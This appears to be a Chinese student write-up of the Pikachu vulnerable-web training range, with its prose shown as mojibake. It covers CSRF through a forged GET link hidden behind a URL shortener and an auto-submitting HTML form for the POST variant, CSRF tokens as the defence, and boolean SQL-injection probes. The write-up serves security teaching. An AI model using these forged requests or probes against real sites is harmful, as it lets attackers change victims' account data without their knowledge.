> <font style="color:rgb(57, 57, 57);">Cross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œåœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸º"one click"æ”»å‡»ã€‚ å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚  
</font><font style="color:rgb(57, 57, 57);">è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚  
</font>**<font style="color:rgb(57, 57, 57);">åœºæ™¯éœ€æ±‚ï¼š</font>**<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxiewww.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚  
</font>**<font style="color:rgb(57, 57, 57);">å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼š</font>**<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">ç™»å½•---ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚---ä¿®æ”¹æˆåŠŸã€‚  
</font><font style="color:rgb(57, 57, 57);">æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚  
</font>
>
> <font style="color:rgb(57, 57, 57);">ä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿ  
</font><font style="color:rgb(57, 57, 57);">äºæ˜¯ä»–è‡ªå·±è·‘åˆ°www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼š  
</font><font style="color:rgb(57, 57, 57);">ã€http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Changeã€‘  
</font><font style="color:rgb(57, 57, 57);">äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œ</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚  
</font>
>
> **<font style="color:rgb(57, 57, 57);">ä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</font>**<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">1.www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ;  
</font><font style="color:rgb(57, 57, 57);">---å› æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚  
</font><font style="color:rgb(57, 57, 57);">2.</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;  
</font><font style="color:rgb(57, 57, 57);">---å¦‚æœ</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚  
</font><font style="color:rgb(57, 57, 57);">---å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚  
</font><font style="color:rgb(57, 57, 57);">å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼š æ¬ºéª—</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œ</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹</font>~~<font style="color:rgb(57, 57, 57);">å°</font>~~<font style="color:rgb(57, 57, 57);">å¤§ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚  
</font><font style="color:rgb(57, 57, 57);">---æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">å› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼š  
</font><font style="color:rgb(57, 57, 57);">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›  
</font><font style="color:rgb(57, 57, 57);">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›  
</font><font style="color:rgb(57, 57, 57);">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚  

</font>
>
> <font style="color:rgb(57, 57, 57);">å¦‚æœä½ æ²¡æœ‰è¯»å¤ªæ˜ç™½,ä¸è¦çŠ¹è±«,è¯·å†è¯»ä¸€éå•¦</font>
>
> <font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œCross-site request forgeryâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>



## 3.1 CSRF(get) 
é˜…è¯»äº†â€œæ¦‚è¿°â€éƒ¨åˆ†ï¼Œæˆ‘ä»¬çš„å¤§è‡´æ€è·¯å°±æ˜¯æŠ“åŒ…ï¼Œè§‚å¯Ÿæ•°æ®åŒ…çš„æ„æˆè¿›è¡Œåˆ©ç”¨ã€‚



æˆ‘ä»¬é¦–å…ˆæ¨¡æ‹Ÿä¸€ä¸ªè‡ªå·±åˆ›å»ºçš„ç”¨æˆ·ï¼Œç™»å½•è¿›å»æŸ¥çœ‹åŠŸèƒ½ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633767.png)



å°±ä»¥ï¼švince/123456 ä½œä¸ºæˆ‘ä»¬å½“å‰çš„èº«ä»½ç™»å½•ã€‚

å¯ä»¥çœ‹åˆ°æœ‰ä¿®æ”¹ä¸ªäººä¿¡æ¯çš„åŠŸèƒ½

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616525.png)



ä¿®æ”¹ä¸ªäººä¿¡æ¯å¹¶æŠ“åŒ…ï¼š

ä¿®æ”¹ä½å€ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621564.png)

æŠ“åˆ°äº†å¯¹åº”çš„æ•°æ®åŒ…ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622798.png)



url ä¸ºï¼š

`http://pikachu:8765/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=aaaa&email=vince%40pikachu.com&submit=submit`

ä¹Ÿå°±æ˜¯ç›´æ¥è®¿é—®è¿™ä¸ª url å°±å¯ä»¥æ›´æ”¹ç”¨æˆ·çš„ä¿¡æ¯ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616558.gif)



å½“ç„¶ï¼Œè¿™ä¸ªä¿®æ”¹æ“ä½œåªèƒ½æ˜¯å½“å‰å·²ç»ç™»å½•äº† vince è¿™ä¸ªè´¦å·çš„ç”¨æˆ·å»æ‰§è¡Œï¼Œæ¯”å¦‚æ¢ä¸€ä¸ªæœªç™»å½• vince è´¦å·çš„æµè§ˆå™¨å°±ä¸å¯ä»¥æ‰§è¡Œä¿®æ”¹æ“ä½œäº†ã€‚<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051626265.gif)







å›åˆ° CSRF çš„æœ¬è´¨ï¼š**<font style="color:rgb(77, 77, 77);">æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œï¼Œæ¢å¥è¯è¯´ï¼Œè¿™ä¸ªä¿®æ”¹çš„æ“ä½œåªèƒ½æ˜¯ç”¨æˆ·æœ¬èº«è‡ªå·±å»è¿›è¡Œçš„ï¼ˆå®¢æˆ·ç«¯å‘èµ·çš„è¯·æ±‚ï¼‰ï¼Œåªæ˜¯è¯´ç”¨æˆ·ä»–è‡ªå·±å¹¶ä¸çŸ¥æƒ…ï¼Œä»–ä¸çŸ¥é“è‡ªå·±åªæ˜¯ç‚¹äº†ä¸€ä¸ªé“¾æ¥ç«Ÿç„¶å°±ä¿®æ”¹äº†è‡ªå·±çš„ä¿¡æ¯æˆ–è€…å¯†ç ã€‚</font>**



**<font style="color:rgb(77, 77, 77);">ç™»å½•çš„ç”¨æˆ·æ˜¯è°ï¼Œäº§ç”Ÿçš„æ•ˆæœï¼ˆpayloadï¼‰å°±ä½œç”¨äºè°ã€‚</font>**

**<font style="color:rgb(77, 77, 77);">å¦‚æœæˆ‘ä»¬åœ¨æŸä¸ªå¹³å°æœ‰è‡ªå·±çš„è´¦æˆ·ï¼Œå°±å¯ä»¥é€šè¿‡æŠ“åŒ…æ¥çŸ¥é“ URL çš„æ„é€ ï¼Œä»è€Œæ„é€ å‡ºæ¶æ„çš„URLï¼Œè®©å…¶å®ƒç”¨æˆ·ç‚¹å‡»ï¼Œå°±å¯ä»¥å®ç°å¯¹å…¶å®ƒç”¨æˆ·ä¿¡æ¯çš„ä¿®æ”¹ã€‚</font>**



ä½†æ˜¯ä¸Šæ–¹çš„é“¾æ¥çœ‹ç€å¤ªæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨çŸ­é“¾æ¥è¿›è¡Œå¤„ç†ï¼š

[https://theurlshortener.me/](https://theurlshortener.me/)



```plain
http://pikachu:8765/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=aaaa&email=vince%40pikachu.com&submit=submit
-> ä¿®æ”¹æ€§åˆ«:
http://pikachu:8765/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=18626545453&add=aaaa&email=vince%40pikachu.com&submit=submit
-> åˆ›å»ºçŸ­é“¾æ¥ï¼š
https://url-shortener.me/66MG
```



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633309.png)





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631903.png)



æ‰€ä»¥å½“ä¸€ä¸ªç”¨æˆ·æ— æ„è¯†çš„ç‚¹å‡»äº†ä¸€ä¸ªé™Œç”Ÿé“¾æ¥ï¼Œå°±å¯èƒ½è¢«ä¸€äº›æ¶æ„çš„ CSRF æ”»å‡»ï¼Œå¯¼è‡´è‡ªå·±çš„ä¿¡æ¯æ³„éœ²ã€‚

å½“æˆ‘ä»¬è¦æ‰“å¼€ä¸€ä¸ªé“¾æ¥æ—¶ï¼Œåº”è¯¥å°½é‡æ¢ä¸€ä¸ªæ²¡æœ‰ä¸ªäººä¿¡æ¯æˆ–è€…æ— ç—•æµè§ˆå™¨å»æ‰“å¼€é™Œç”Ÿé“¾æ¥ï¼Œå½“ç„¶ï¼Œè¿˜æ˜¯**ä¸è¦éšéšä¾¿ä¾¿æ‰“å¼€é™Œç”Ÿé“¾æ¥ä¸ºå¥½**ã€‚





## 3.2 CSRF(post) 


è¿™ä¸€å…³çš„æ•°æ®åŒ…æ¢æˆäº† POSTï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631790.png)

é‚£æˆ‘ä»¬å°±ä¸èƒ½é€šè¿‡ä¼ªé€  URL çš„æ–¹å¼è¿›è¡Œæ”»å‡»ï¼Œ



æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„é¡µé¢ï¼š

```html
<html>
  <head>
    <script>
      window.onload = function() {
        document.getElementById("postsubmit").click();
      }
    </script>
  </head>
  <body>
    <form method="post" action="http://pikachu:8765/vul/csrf/csrfpost/csrf_post_edit.php">
      <input id="sex" type="text" name="sex" value="God" />
      <input id="phonenum" type="text" name="phonenum" value="11111" />
      <input id="add" type="text" name="add" value="I'm hacker" />
      <input id="email" type="text" name="email" value="111111@pikachu.com" />
      <input id="postsubmit" type="submit" name="submit" value="submit" />
    </form>
  </body>
</html>

```

æ”»å‡»è€…çš„ç½‘ç«™

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629672.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622586.png)



å—å®³è€…ç‚¹å‡»é“¾æ¥ï¼š[http://pikachu:8764/](http://pikachu:8764/)

ç„¶åä¿¡æ¯å°±è¢«ä¿®æ”¹äº†ã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633170.gif)





## 3.3 CSRF Token


<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623301.png)



è¿˜æ˜¯æŠ“åŒ…ä¿®æ”¹åŠŸèƒ½ï¼š

å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¿®æ”¹ä¿¡æ¯ä¸­åŠ å…¥äº† Token ï¼Œé‚£ä¹ˆæ¯æ¬¡ç”¨æˆ·ä¿®æ”¹ä¸ªäººä¿¡æ¯æ—¶ï¼Œéƒ½è¦è¿›è¡ŒéªŒè¯ tokenï¼Œè¿™ç§æ–¹å¼å°±å¯ä»¥æœ‰æ•ˆé˜²æ­¢ CSRFã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631891.png)







# 4ã€SQL-Inject
> **<font style="color:rgb(57, 57, 57);">Sql Inject(SQLæ³¨å…¥)æ¦‚è¿°</font>**
>
> **<font style="color:rgb(57, 57, 57);"></font>**
>
> <font style="color:red;">å“¦,SQLæ³¨å…¥æ¼æ´ï¼Œå¯æ€•çš„æ¼æ´ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">åœ¨owaspå‘å¸ƒçš„top10æ’è¡Œæ¦œé‡Œï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€çš„æ¼æ´ï¼Œå…¶ä¸­æ³¨å…¥æ¼æ´é‡Œé¢é¦–å½“å…¶å†²çš„å°±æ˜¯æ•°æ®åº“æ³¨å…¥æ¼æ´ã€‚  
</font>**<font style="color:rgb(57, 57, 57);">ä¸€ä¸ªä¸¥é‡çš„SQLæ³¨å…¥æ¼æ´ï¼Œå¯èƒ½ä¼šç›´æ¥å¯¼è‡´ä¸€å®¶å…¬å¸ç ´äº§ï¼</font>**<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚  
</font>
>
> <font style="color:rgb(57, 57, 57);">åœ¨æ„å»ºä»£ç æ—¶ï¼Œä¸€èˆ¬ä¼šä»å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ç­–ç•¥æ¥é˜²æ­¢SQLæ³¨å…¥æ¼æ´ï¼š  
</font><font style="color:rgb(57, 57, 57);">1.å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›  
</font><font style="color:rgb(57, 57, 57);">2.ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›  
</font><font style="color:rgb(57, 57, 57);">3.è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†"æ‹¼æ¥"çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!</font>
>
> <font style="color:rgb(57, 57, 57);">  
</font>
>
> <font style="color:rgb(57, 57, 57);">SQLæ³¨å…¥åœ¨ç½‘ç»œä¸Šéå¸¸çƒ­é—¨ï¼Œä¹Ÿæœ‰å¾ˆå¤šæŠ€æœ¯ä¸“å®¶å†™è¿‡éå¸¸è¯¦ç»†çš„å…³äºSQLæ³¨å…¥æ¼æ´çš„æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸åœ¨å¤šå†™äº†ã€‚  
</font><font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œSql Injectâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>



å…³äº SQL æ³¨å…¥ï¼Œæˆ‘ä»¬åœ¨ç¬¬åå‘¨çš„ç»ƒä¹ ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQLã€‘ä¸­ä¹Ÿæœ‰è¿‡ç›¸å…³çš„å­¦ä¹ ï¼Œå¤§å®¶å¯ä»¥å›å¿†ä¸€ä¸‹ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621489.png)



è¿™é“é¢˜ä¸­åªæ˜¯ç®€å•çš„ç†Ÿæ‚‰äº†ä¸€ä¸‹ SQL æ³¨å…¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ›´ä¸ºè¯¦å°½çš„å­¦ä¹ ï¼š

## 4.1 æ•°å­—å‹æ³¨å…¥ï¼ˆpostï¼‰


é¦–å…ˆæœ‰ä¸€ä¸ªæŸ¥è¯¢åŠŸèƒ½ï¼Œé€šè¿‡é€‰æ‹©ä¸åŒçš„å€¼ï¼ŒæŸ¥è¯¢åˆ°ä¸åŒçš„ä¿¡æ¯ã€‚é‚£ä¹ˆåœ¨æŸ¥è¯¢è¿™ä¸ªæ“ä½œä¸­å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿå®ƒæ˜¯ä¸æ˜¯å‘ç”Ÿè¯·æ±‚ç»™åç«¯æ•°æ®åº“è¿›è¡Œäº†æŸ¥è¯¢ï¼Ÿæˆ‘ä»¬é€šè¿‡æŠ“åŒ…è¿›è¡ŒéªŒè¯

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629917.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631562.png)



åœ¨æŠ“åŒ…æŸ¥è¯¢åŠŸèƒ½æ—¶ï¼Œå¯ä»¥å‘ç°æ˜¯é€šè¿‡ POST è¿›è¡ŒæŸ¥è¯¢çš„ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617800.png)



æˆ‘ä»¬å°±å¯ä»¥æ‹¿è¿™ä¸ªæ•°æ®åŒ…è¿›è¡Œä¸€äº›æ³¨å…¥çš„æµ‹è¯•ï¼š



`1 and 1=1` é¡µé¢æ­£å¸¸

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628135.png)

`1 and 1=2` é¡µé¢æŠ¥é”™

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620678.png)

### ä¸ºä»€ä¹ˆ `and 1=1` æ­£å¸¸ã€`and 1=2` æŠ¥é”™ï¼Ÿ
å‡è®¾åç«¯ SQL ç±»ä¼¼è¿™æ ·ï¼ˆè¿™æ˜¯é¶åœºæœ€å¸¸è§å†™æ³•ï¼‰ï¼š

```sql
SELECT * FROM users WHERE id = '$id';
```

#### 1ï¸âƒ£ è¾“å…¥ï¼š`id=1 and 1=1`
æ‹¼æ¥åï¼š

```plsql
SELECT * FROM users WHERE id = '1' and 1=1;
```

+ `1=1` æ’æˆç«‹
+ æŸ¥è¯¢æ¡ä»¶ **ä»ç„¶ä¸ºçœŸ**
+ SQL èƒ½æ­£å¸¸æ‰§è¡Œ
+ é¡µé¢æ­£å¸¸è¿”å›æ•°æ® âœ…

---

#### 2ï¸âƒ£ è¾“å…¥ï¼š`id=1 and 1=2`
æ‹¼æ¥åï¼š

```plsql
SELECT * FROM users WHERE id = '1' and 1=2;
```

+ `1=2` æ’ä¸æˆç«‹
+ **æŸ¥è¯¢ç»“æœä¸ºç©º**
+ åç«¯ä»£ç å¯èƒ½æ²¡åšç»“æœåˆ¤æ–­
+ å‡ºç°ï¼š
    - æŠ¥é”™
    - è­¦å‘Š
    - é¡µé¢å¼‚å¸¸



å¯ä»¥ç¡®å®šçš„ç»“è®ºæ˜¯ï¼š**å­˜åœ¨ SQL æ³¨å…¥ç‚¹ï¼Œè€Œä¸”æ˜¯â€œå¯æ§çš„é€»è¾‘æ³¨å…¥â€**  

